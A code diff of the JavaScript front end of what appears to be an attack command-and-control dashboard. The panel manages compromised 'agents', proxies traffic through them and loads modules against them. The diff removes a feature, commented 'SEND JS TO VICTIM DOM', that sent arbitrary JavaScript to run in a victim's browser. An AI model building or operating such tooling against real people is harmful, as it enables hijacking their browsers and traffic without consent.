@@ -151,21 +151,8 @@ function showAgent(agentID){
           <a href="https://${agent.domain}:${agent.port}" target="_blank">${agent.domain}:${agent.port}</a>
           <br/>
           <br/>
-          <input type="text" name="dom_command" id="dom-command-js"/>
-          <button type="button" id="dom-command" class="btn btn-secondary" data-agent-id="${agent.id}">Send JS to DOM</button>
           `;
-        if(agent.dom_commands){
-            agentHtml += `<hr/>`;
-            for(var cmd in agent.dom_commands){
-              agentHtml += `<p><i>${cmd}</i>`;
-              if(agent.dom_commands[cmd] != null){
-                agentHtml += `<br/>${agent.dom_commands[cmd]}</p>`;
-              }
-              agentHtml += `<hr/>`;
-            }
-        }else{
-          agentHtml += `<hr/>`;
-        }
+
         if(agent.active === 'true'){
         	agentHtml += `<button type="button" id="proxy-through-agent" class="btn btn-secondary" data-agent-id="${agent.id}">Proxy through Agent</button> `;
         }
@@ -237,29 +224,6 @@ $(document).on("click", "#show_dom_shell", function() {
 
 });
 
-// SEND JS TO VICTIM DOM IF EVER GETS TRIGGERED
-$(document).on("click", "button#dom-command", function(){
-  var js = $('input#dom-command-js').val();
-  if(js == '')
-    return;
-  var $btn = $(this);
-  fetch(dashUrl() + `/dom/${$btn.data('agent-id')}`, {
-    method: 'POST', 
-    body: JSON.stringify({'js': js}),
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    }
-  }).then(function(res){
-    if(!res.ok){
-      $btn.attr("class", "btn btn-danger");
-    }
-    else{
-      $btn.attr("class", "btn btn-success");
-      setTimeout(function(){showAgent($btn.data('agent-id'))}, 1700);
-    }
-  });
-});
 
 // LOAD MODULE AGAINST AGENT
 $(document).on("click", "[data-module='true']", function(){
